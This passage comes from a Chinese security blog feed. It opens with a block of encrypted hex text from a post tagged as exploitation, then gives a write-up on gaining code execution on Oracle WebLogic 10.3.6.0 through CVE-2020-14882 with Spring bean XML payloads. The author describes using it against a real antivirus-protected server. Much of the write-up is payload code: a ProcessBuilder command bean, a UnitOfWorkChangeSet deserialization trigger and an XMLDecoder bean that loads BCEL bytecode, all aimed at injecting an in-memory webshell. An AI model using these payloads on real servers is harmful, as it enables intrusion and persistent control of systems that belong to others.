fdb9001b01d90404454c2acac35578f9c2474f93080962c46a807e1cd93de4bb53713bb8bb5a894587da53bd1651a5e9f4c7d4bfffee02ab874dec2a45efa15442ec6269e0c888c1802d2dc74b88107052c1ef241d7b51a673f164989fbff7fc8b1acd8d672e6282815552be73a7c8607816072e7a8f4212319945a0217e0feea9007ae128db29a982a8de537633a5513390f94e39dab22e73ca3290fd57078736ee44246da433f531a4662f375a946c35a9d9c53a3a7682d719da6315fe6b6939c631f6c448d972fbc33d1f9155ee3e9cd4b9243cd9720e97fc82a71f2d483653ab10b957f83a2fbc00e5b66f6561fad8f4667f722fde4e8e9273d1f8259cdf1c30b942213e39f61be3c67d6c7f482fd0937e039866f49e63789578440f0c1acaf8848388c8e17b35333ad2120e0060124a336c3719f026458fdcbe15b93d993f5a85481a49a884446dbfea44bc1f0e2f3d5eedd7309579b3010320d1f8f6198eda270de7d4fb7021a938ad9b2ffd38239016798561697d93a8d705e742ab2e8ccc1a8661f2e8df3e0b6cc35c5b8ecaa914cf24fe4a26f592d630d5e6f2a54a876b8c22e3e5f6899a71b8f123d1395fedd78ae111a58b0cac1944464d0977eb89a405154730944c16323bd1ae7d776aa12e6931f15833fa08a62b645c111b234f0f2b2448686c90737299f74aaf2ee9bac510c0037c79c56d3f70931b38c12662d024e1cfb3f7e7a1f60833037c790beb24e5dd584b98e50dadde7cc2e4cd670985b9df35744b5a97efe91a24e20c8d69bb156451feaa5bd083d2bb78f01150b472fa18af997ac10546527cd3d1484d41be50764a203daf9ff22b4ce84505b0ef4167d12f9269ef35ec8425673a18d36a00b7bf61056ce24ae5e11db8d31a9e4c985a0caf44ce5485d1c0240253f67babeb965328b072711f7fa1f9863ace73029e3642399e3a46e52646aa580587c485ed08de5150a200b71e80e4bb4f1c8b0d152be59d72eea4c4a19e63a3141e19019266cc126f46db5b93a212ccc4ffd23bd20f400f1d52bedab31903e531103aedef7ff881854555a07edf5997246a95c0259791eedf88b6f61de3c37da632d6a918752d6e0225b7ff7794e2ac41ef24b4f4e5de8aaff115060c6dcc2a6a00e3e5ec3b0aa989815075838ce417675dfa604d6f9d92c453904cf493694737c689e127c50c04fc29e84d12b2cb0414f6e5792d89eb57367995770350bd1cb843ea955358848f7bf5f8663c226d5cc19a2c1e980403fc4a991e7c9bd836cc7f5349fd95d7d7695f244d41ac693fdb2c30527e0cef8a276770fca057cd3b3f2c6a81e020dac40894ab0184d89178ae0891828a5eeee164b018eac68e2089772f05cd1c0ebc843e3fda31dbe529925c477b1ab09dd9431056e74eab2956ba650450fbcbd16efcfbc90a5ab1104ccae12f3100f14614e64de4df388f21986a0c7301dca659d95818efc6ac3df705e1eced22ccdf8a3b2e921197b3c4708a7459fc2720718e7cf19f1e9c18b521a0fc0a9eb691cb5a03c144ee593ad6dfcb047305ac224f1e48d28c0384e97195ef27a4ca45f2aeaeb6741959a3697836262ac88f8d2fe209dc1f09288651cd98eda157ac7c7e88a4494ec8097c10a85f40f771cf23ec92bc85ea52c64e52f4a15a623bd1f85da5f670fc35eb214cbf5a070c815f0046e2f5be770c9ea71a8f94e9fe4219abbabe5c483107eb7c5642eaee40abc0115bcb580beb140826802f0af678eb4cc6fbbc4c66138432ef1b5f2071e01cf1097a6f7cdbebbc940a5138266c3a985c85bc5cc9ef2fc221012cc006a68b265dd4deb46ccf235ada8e68125b24b4b774892eb777ec9188d50b5fbabfa7911906bc5a16673bae7e66251c9d83752434250a1af5b8ae4435800543d8738d9a04d2afa2aa69be6d74c522cf3378cd26815c01da480605d00d6657213212998691966e360da8007356fb45e47f85f1e878af8693eaf78eb284ce0a4e5d7b4b4a85142f9cc828f8efb45cec437d0ea871071c89b524af554c045f2be729f3f81af3bd9d5fb844f2fc49d34e382bd18a4c3ae5cbebcbd955556f6453fdb8ac80a542dbb3e8fd25115e9ea8e5910998f6481594a87a4fc26eb4239a032b927163180c277e064ab158af73719e92346598159d9c5a41d6cca919e0d7bd0373c70e9d739338d9ecbaccb4bd2fac7d06f935c351cb886049aa2cfb0c1dc965ef38b1671b321e91d64284cf8004d378e198b90afa5faf45b1504186ee4b34c137a33277ab97b69642c048f7470bc3b324e18ebf83fe987cf5f1f93f34771b694e4211e3efdc2cb75d527a1f4aed1638aa6aef121578406821efda5ff4e463cd8ed372e5aeb398c83b433b91ff3d5e9ae6e64f8814882be8d4315849a5863419e65b7283f197fa65d3767d50ddf5aaeea6fdf30185aa93428901edd042d73417bba1c66895292b46f281564fccf71a9ae14f04f9eadef450173401d9268a60627a7da4fdff5c9b233d8ea211663b742d79f325856123b1b11aa517c006f511c9730d426b5bf247ddacbd53461b187bfc0fd9bb7cce89d66141c1b5eecf3028c7875049b80d41248a4ec5d9e34f8b0f1740cbd59d86cd61c2cfd8b537504b40a5ea498f539d68820f46ea4a27bcc954ddcd64f8a077ed7bd6d15bf146828d5864240987c9327898ca917d8c2c594d74ae863fe5112f7b61eb5f6d44fa606b307037e8baec83b867489433f33f4ac7d4178385009ac282a78715d0d68c0ff1ac7ddd61cad2396d494a24254b4d15443d5e91fef7559e68980016069e868da937714231cd89317eddd64dc0309f6b5fb50cc01cc8286acde52d0c31d719f11785f50feae723e8a684d78469e16ad69ac39c38ae4f954c1629311004e10888f484e3e298dc2a2d48e482724c0702ffb2d42fcebc3aa8cc896251a911957b9661ec99ad35eaa4dc1bfc2418bda367b29d35ec9350a093ebafcec85274d83632b062c384e606bfaae7bbe3eb0a34c26d9c627b9e219dd41079df0397ad2b49c42b5bc935de4a26b3210379808c6823f050a77771ab0022cedea95c9076c1f04105f11a81c10521fbcccbb50ef85eb168eab867c5a68cb9d8a07ae261483ccb6703a5673208d22610d5e465535c97a8fcbd19e9a8ec4f69665dbec4b5ecab372b33b0f86b3fefeafe3a49604812f19a8e6833599f3d1101092dfa4ac2ce2a2fb01de2776ec382c8ebb3f6e3e5f574da5981b30a41c725bd90ecb89f5be2ada2045208cc7fbf5c8d45500a74aacf2830e750af55d0bdaf476942354f3e7a1d6a9085a11f53958ba6f08721e2d8baa761f7ef3a47105e188792c7a20eba26b3fb4bfd557287e2ab165c2b81321225853dcffc73dcf73910340950e03c6aa70ed64761bfd968332d2315f7878025c811a92c7a5b02bad1b91cdd791293a5a2ed07822e2ad2eedeee5bfdc520eb7da804137679534abc8b52a3febc029a27712961b72b621ecc6612b6213805380a847cc008ad9ac1b3660e1311091e80a989bb4f5677203476e7fef67b22cd93a2dd857bc4dcc8017dee8203299cb13f81cfe8e64e3e25f9576f92ec7c7634b86cff07f16e7de8f7a4144c3c082553a47834d2fa4c3cd52fc2e86a05812119abe22a4e52c47bfbae1deede193a5f6d269c584909b9980d90a8d4c54fe31c2996a269221ff0698c0b32861d992ce0778a7e0d7bc948b2f2e33cfd594a8c93b16bce97fca1b4a691c479cacf78c7e11fc88a5e189a1e0ee2eb52766ee21f223f398a4e01940675b42ba3182be2bf62ab76d02dbb508cdcce8c2eae238d5d6aab69beb11f8c219a5ce561340bf30a3aac10d69baaa70b5010360a00b39302a90afbf1f06e3c03730e389d5b56eb7c94ddb0b788111a24e39c24103ad1da3dc3bbe4b8e299a2ae25e9fcfd7b5bbf2d783bd4e8e01fcfcd7d46ab977d1f0358e8fe4578901aba2716d81d6905971d4afb11ae7d5d6c3b92ca99abafdeda16c270f809344d49e0ccf5f7ae644a9dd10b21a0b836b78b54dbfa4cfe0b5643e77816cfbe515b8503d7cff369b2234ce297bd3f39adda139bf90dc56eba182c89591986ed323203f6ec55eb09c136d6b728cb8c5b9ed9dfed7b77396743f8754bd876a7d6e6a587d092c244482b82d6b21160ad9867bf46ead36dc9eaac63da66ff1b02a63f156e354e2531708ebc088a55edff0f59ef6451ae4f65bc90d0efd1d8cae40b71f29ed3c301eaf25f5683c328dce7e5ce44ad28744340065c3ade4b88665c23a0ad2baecafa1d2f01e75eefedf13c28cb1c54d41585734a4fe432ba9a52cc6859c48f74a1b005f100122a4c7c2a33aadd010d227e789634d89faff3e5c64831f9278b2dd4ae3b1ad61ab83ac6437ae740501886ad1844bd648981f744504ed5a9a99b2ddc27fd5123a107339cf6937e5a1e3466bcf36f3f4228c6fcf38cc69684684b891c63eaf082cae4052b28c928b1dd031f4bb48625fdc6b45ce4e4ca96ef0b552622146bd2aaf802af7e942e35f6b181646e8ad15bae2cd814f94289003ac7ab201e729ea08ecd5060be74c97e534239a58d910f3ab79109b7e710f6320d785697681b918afe4de93aefe433a05499642b97815a242c93dbfe03b1cd292fb93862fcfddfc8f9d06ed1be0417a0c572bf4f3d836c3fe46d863829bd2c25f606f3f8756036db14e7aba43f0fcae2a686910882599db5cb88d7a30006cfd4a082c9f28cdd6305bb51f44382cf3550af76586f3b525439632794e5486b58a420328bc8259238043cb6abdf6ef007242b6daeaa00f9597cd713b2ad6ba642da2fab37e607c3660a200b3d689dae73cea754d855d50334d3b0cb812b0deccdf91adeb78d35a9487fcae4e541a2e75cba701da0a18ae441a0051f455d071768470b2c94bec505d5778c10c23c961a915f9b6be3a3eea74305f659cbfb5d91c80af25323057dcdbc3ff28e7e1382d33e24909da2ad00f2b8ef461efe513f888d175a387ddf401063d2470fbd9c4ea542e1994bfd754192a1db0450047317fdf16ef67b4aa4a312abc08a4108efabe8a1d9cead79c49ca737873a9be0a4f224969b820a40be84897f4f6cf4e6fe96ad74f9462242b57499a1014518eeaa5897713268007dc7ef2b7e927da8851fdd15fda4f494774598ecd01a993879b7b8507ef84c6c73c1dbdc3d369de82a713e7eebd70223001eeffedefb0e8a930fd65a493fb2c3de9d4bacb267dc69af17ddac065671972feb209bc63d5fb115e9aeff96be75d52f5d60c7d6c5465882cc92fb46f58f7a765b981f4a9ee3d788b505deaedf0f2f71fc1b29599898c68870fe3cedd5122aa5636aedad2378fba84429d82e86630bb14faf1e89320dc299f569b9325e6f6915224043474ddd747cc0097c2394d8c3876af3998eb49106de3813694b0584b73151be5b5f24375fa43a11549a344c81a81e3342983b7b01f12b4a7c7d3c77ae0cb4664f30128d97a4fedd848f5932b6d140309e2f71578fe0e808b106fad2c56d7b438be59951fed6c856daab6c5f9f7dc2d16275593393b6eeb6e4dd1ff4c3a12b1d02bca3bdcf5a37bdbf41821fd3e9255161fd268aa87213a06dfdbdbf9750a83cfaa20cb2866f765a5c116c31520fc6a869c28417186e297620e2e91b384b69fbe43f0762185573029873e89c7d1bbcdf39c23e4e922f1e98a9770a747f39c9b886d899e865ec39cfc10c2fe5e5f709fa7d8c1fd9c133c799dd65d744fdccd3c21658ed3cf5bc37e401b002200c9c6e53794f97eeb86889520083b97e1c67267cdcf0515940f5dfb111f9126723075b5e1271442f77fdf78a958a796868f1242ca9b3eea161e01de2c787cad8c7e8155f73a49654543d3d5cd88a2fe0c1c82141d6bc2585344a2e7782dfd0b17fe3c8c6e17025e97f78c58263bd03fd18a96e1587d7d37e5dd7681f6facfa13ffb0d5c3611981f57f4edfa7c3a40743a50a2cdf91bd3f05de6723d6a58fa2359299a0f809e0b994305e15616f7c04c6e87b0cf29b4c6a824b4a8b4c2bac6acc0339b88e4fcfbb0c3b279a4da0fc15d85fcabcefa9fb28b05212b6191087e228f980c8d78083acccb29c215625802b4eaaa5a5433ba123ec33eb960cc1406c124aaacaff5f9bf8af7f6911a14cec4020bdf9921b1fd20bf11b4410b848861efb63633cdbb5a7c1c7337fce1713b4886073b62b478666fdb6f2ccfff55237fe42f70daf9c516f1908901322b443aedc975579f2c3a844560611a34e908ed22368b677166c377fb10bffbe5dea3502e329b68ee0c835573b3e068f16649b2083c66de607fa062df7f5867e7ba877893fff83c57a4ad2a7020fcc5f8871c3bb398dd07502d3f22c795ed2533543402d14263d19980b26886fefa09e4fd59b4b972fc7fa081363fb202de20bce9f6cef946e76f54bd3cf0a77de71075a7525ccf6ef3222600e00df9f5f8e6ff091017036231e86da602eb523a4173b96e3414c5a9189180c61b55e7c2dcb53383dce136baf5a04d9a7d4c8df7d2b2909e04e1da355725fb4b68562a56d8e65bae2f1dd42e6d29e95babf876f104e3849cdfc9c21016f6aebbdb42c721e6a9c55e865812cef39403681501e471bc93e8e24f4530978e51523aeb8a5d0965115dc6b2db833d45a2360ba39b3cf636bd563348973cf572804bbf281c3072062b06901283b70484e03295bb2b179b1e9f9f65b0ff8dc1f6137dfdfda6c3180e6496f58cd3be19100e28eba973e256a8bed00e002c6b4c4322269a6815b16a08d1f25a5f28b9156a6bd5c4af8087f6de2c30c32b426dd607cc8df8eaa184c23140a987c3daabbf63e0eb5f2c289470b0daafd213c944edfbba7df0ca9725360fb1d32b184f3923fae97c555d6cbe81787e69a1ccfe98452de2ff41ab2f6ca929ac93cfab8ed141e5a7c9d52e7a23e770dd2a63a47119622675879b3caf999b111939dbe59ce3a255747c3ff90fecff997274bca35b9b819e2b4539d3b2520d393c9590739b920ed04a2b73dd995236c88f2b14da71cbe81a107ded2ffd963a6f718b9b4437faea67d3e6ccfcddc60205a97ad3e9521d508b8072489b6046438a5f5d86e54a2c8fb3ab2cadb74a5d84de4dc3912633ba86da51d2f32e20d7123c180631d48e5e61f11107f8b5df9c6eda49a0e190d3e1183137e65bdd19f14fce504e13e18d6e6b169a653180af24a23fcf4fad4aad90ed47ad7bc4be79da290bd1d509a2c28c8df879761cdf23ba9c1245f3bc84d93ec94e3a92f0e641319ae2fc939264853a375fc15275c83e84cf6af9ac285fa7a192d69ac0b13869dbfd6ff0d5f831c471bff3aa3c9a8f076a5237ea7b52ed872a87c44ab5e1ae5572504a4a7e7c2652afe5f67d0291b738c88fc49c9faff78a6515e13e41f0c774a4b907b191c5fa9b4f0cd4ceb07968dbcccfe7f2e7f3b7eb96e44a8d8f4e60bd7b0ff936949a9a68101d2f403151c8e41ffdc22c05d92899417a8f76cc28ea6d63ca2a29b117ab3ca57340f86f09f357c3fdb0d5a31521a74299b96b5090362b796d37ee38b329e62b436e295cf0930d32dcba55c2aa30348285fdca27eeb751c224fb1a1e3132f077eb7bc7e2a60ef4a4ad3e016f410002b66f6255666605b7942436be730f172a00735efb7632b123b100c3a415dc77de2d96a5f2dc411d168fe128aafb251c28019d3959edd1ee450ec050bea9713dbba3ac5dd7208cda5f2261bdb910a46f80364f91ba65aaf8e6295863e69daca815fd34251670703fad06b8c039c47e07f5293f3873f80eb9cce8d51a74d045268c31d33af46173b2af6d57ff4d707aad8766258c4b8bbb9e2436f88423d3f54aad7763a984a126afc5cf52ad00b63919a55783878e882122c64167735e4939defed20ef6d995132158890b71cc7f0b4bb49ddf685f88ec63faa38a99d6e1cfa9322b1be5fc1905f4ab590c6ae92b0a2c8688bc85bc2833ad7aed270494e55cd563446288c741963019b5742b579cbf7c2ff9f5c7d2fd1b688d2c046f957eb2620ff9a80add2b929fe180ea96c99c297c8989f6f8d6c2158d5380eb8762a1f23e39b76c74e37020ae2138f3c0dcf421cd409d2158729ff504abcf292d157051eb4f8afbb8a1dae803ac41c61dfad0f499e459e3729c10f3d702ad23ca81d8de866263142778770aac9443a56066555468311899cdc7fca7c88c98ba6068cc2a174e4c776681ed195aa3574278d9c68841ac1d5a699932c9af39e7557abd815d625e67c3021b116a04f120b22d13158d01ac8e42f1ad8aceca725608a26079efe3ccda95997e22ef455414742f5685f6fd5b0b63d277ed7f8bc2fc4f5b48087605e07c74480868fb06df4bb3d4f6a5cfefe73703c1d21d648b072d9d02ed6a7e368b83e61b46289b296c8d4ddf9b0d49d6fc1e6a5d5e2aee2e4bc3bfbae2ed74f457e555e4f6aa651333a865e9f8341a49bc57b6b42d1563a3a5b9d90397a4663b95e1b9a929ac87f3104420ffa66e9c05b89c2a8ea109b07c31bc781897a06b7d1a16693f219481aacda756b3e5bc34229a1e6db479f7ed42e2244fd22ab371769966e2ddc39baaa7ba25db614252442f32e22d15e14c32d17bec27a03e10ea64e5fc3d28dec6d88b695a37cc8b388f2b7718ac790dabd33211cc5036adb4e69f0bbfc710d44888b661df7ab0530f689c50e4e4f50cea1e0c035a282a737649a1f81a544cae2f09edfd818b5aa85d28119d05cf3fb12b33990149563a578612585058ffe4c2ebb86b53c3dd228c67ffca3ea9a60e6204c3d81c06eae8dfd2eb3bfcefb59230d904ac53ee5622d229e9c59563afea4b3ef70759a96bed83a891d03e3959f60f40efb36b9d1711e1d6e7ff6fb18ea3d5909666e4c21d7a949d70299b1130ed56bdeadc8e83fa157bf99025d73059467bd88382c783ea872adf49abf9d400b7f09c13ff030bb87788dac3b43c0a3583f4ed47905d0314de088259fb1142868026d01709d285afc7ae86490ea758bf60b97e6f209ecef0e9e566df82c91351efd862cb6b2ef84e0e957e9942062d4ec996b01bf83779dcca2e473bbe7b51d17f68a4fcac737455edc5eb558ffcd3106e82d4fcea3168dfaf934fbebb77fe4f038226adc21672891e44e0ca1b474ebf7522601582cca6193d6606ae55be8c784e8e7e39c4d3aef863f70166290f3377c0f67b3a938af7cdb06141395541b47a72a2f073ee5db4b9d1416626a3b6e1f5568c15c179a90fc133daf012f5378a9ed1bb5d99c53f63e526df42432686d3afe42363b052d8f986bfe95299f659f54717bf807027202729427269897586271b8f5b04b398dc933ab5eeca972ac7e3a3494404b0a6ebea242456e682812388c64c9158b6f3f1a5cdef288ffebd535fa48008d17ccd5a5ece33d51784ea5a812acc31d441f6345a376410ebfc46707e9aa8c5d99211bf9f1139f232d63d7ec13b51cd32c92e6a37c722d0d2aa8a694d3c15eae8878922cccd616106b6730b6a83162eb32dee16bae522119231b0a6a9c5830255ad030a3e55588a484b43dd537994543bf8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic下spring bean RCE的一些拓展</title>
      <link href="/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/"/>
      <url>/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>有一次通过<code>CVE-2020-14882</code>漏洞打了一台Windows上的<code>weblogic 10.3.6.0</code>，服务器上有杀软。由于公开的如下spring bean payload只能执行命令，拿权限很困难。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[calc]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只能思考如何构造可以执行任意代码的<code>spring bean xml</code>来一键注入内存马了。</p><p><strong>weblogic下spring bean执行任意代码的主要困局是weblogic下的spring不支持spel表达式，导致我们无法通过spel表达式来执行任意代码来。</strong></p><p>同时这里顺便提一嘴，个人认为好的payload应该有以下3个特点。</p><ol><li>兼容性高</li><li>利用复杂度低</li><li>简洁体积小</li></ol><p>接下来将以这几点要求，分享下构造该系列payload的过程，这也是我在编写woodpecker利用插件时经常经历的过程与思考。</p><h2 id="0x01-init-method系列payload"><a href="#0x01-init-method系列payload" class="headerlink" title="0x01 init-method系列payload"></a>0x01 init-method系列payload</h2><p>目前公开的payload是将恶意数据传入构成函数，然后通过<code>init-method</code>来调用一个无参数构造方法来触发。按照这个条件，我找到了两个可以执行代码的class。</p><h4 id="1-2-UnitOfWorkChangeSet"><a href="#1-2-UnitOfWorkChangeSet" class="headerlink" title="1.2 UnitOfWorkChangeSet"></a>1.2 UnitOfWorkChangeSet</h4><p>在weblogic 10.3.6.0版本有一个<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>类，构造函数可以直接触发反序列化。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"oracle.toplink.internal.sessions.UnitOfWorkChangeSet"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 反序列化gadget序列化数据 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>-19<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                ......</span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这个payload需要有gadget才能任意代码执行，显然不是很完美。</p><h4 id="1-2-XmlDecoder"><a href="#1-2-XmlDecoder" class="headerlink" title="1.2 XmlDecoder"></a>1.2 XmlDecoder</h4><p>在使用XMLDecoder反序列化时，我们是将xml序列化内容以流的形式传入构造函数，然后再调用readObject无参构造方法进行反序列化。所以我们我们完全可以通过XMLDecoder反序列化执行becl代码来实现任意代码执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String xml = <span class="string">"&lt;java&gt;&lt;void class =\"com.sun.org.apache.bcel.internal.util.ClassLoader\"&gt;&lt;void method=\"loadClass\"&gt;&lt;string&gt;$$BCEL$$$l$8b......&lt;/string&gt;&lt;void method=\"newInstance\"&gt;&lt;/void&gt;&lt;/void&gt;&lt;/void&gt;&lt;/java&gt;"</span>;</span><br><span class="line"></span><br><span class="line">ByteArrayInputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(xml.getBytes());</span><br><span class="line">XMLDecoder xmlDecoder = <span class="keyword">new</span> XMLDecoder(inputStream);</span><br><span class="line">xmlDecoder.readObject();</span><br></pre></td></tr></table></figure><p>把上面代码转成spring bean如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span> <span class="attr">init-method</span>=<span class="string">"readObject"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"x"</span> <span class="attr">class</span>=<span class="string">"java.io.ByteArrayInputStream"</span> &gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- xml序列化内容 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>60<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>106<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>97<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>118<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>97<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"byte"</span>&gt;</span>62<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                        ......</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个payload看着确实要通用很多，但是体积太大了，注入一个内存马的xml要六百多k。在本地没有问题，但在实战环境上没有成功，当时感觉可能是体积太大的问题。所以只能思考如何减少体积。</p><h2 id="0x02-factory-method系列payload"><a href="#0x02-factory-method系列payload" class="headerlink" title="0x02 factory-method系列payload"></a>0x02 factory-method系列payload</h2><p>后来发现通过init-method来构造payload，限制有点多，人工找class成本有点大。摆在我面前的有两条路</p><ol><li>编写gadgetinspector规则挖掘符合条件的class</li><li>再翻翻官方文档，看看有没有可能直接调用有参数方法。</li></ol><p>很显然挖链成本高一些，于是我打算先走第二条路，走不通就只能死磕第一条路了。在看<a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html" target="_blank" 